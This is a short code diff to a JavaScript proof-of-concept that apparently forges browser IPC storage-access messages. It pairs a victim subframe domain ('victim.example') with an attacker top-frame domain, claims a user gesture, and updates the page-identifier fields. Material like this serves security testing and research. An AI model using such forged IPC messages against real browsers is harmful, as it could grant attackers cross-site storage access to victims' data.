@@ -31,7 +31,6 @@ async function main() {
     const VICTIM = 'victim.example';
     const ATTACKER = 'attacker.example';
     const frameID = Array.isArray(IPC.frameID) ? IPC.frameID[0] : IPC.frameID;
-    const pageID = IPC.pageID;
     const now = Date.now() / 1000;
     const RD = (d) => ({ "string": d });
     const WT = (t) => ({ "secondsSinceEpochSeconds": t });
@@ -77,7 +76,6 @@ async function main() {
         subFrameDomain: RD(VICTIM),
         topFrameDomain: RD(ATTACKER),
         frameID: frameID,
-        webPageID: pageID,
         webPageProxyID: IPC.webPageProxyID,
         scope: 1,
         hasUserGestureOrNoUserGestureRequired: 1,
@@ -89,7 +87,7 @@ async function main() {
         subFrameDomain: RD(VICTIM),
         topFrameDomain: RD(ATTACKER),
         frameID: frameID,
-        pageID: pageID,
+        webPageProxyID: IPC.webPageProxyID,
     }, (r) => { hsaReply = r; });
     for (let i = 0; i < 40 && !hsaReply; i++) await sleep(100);
 
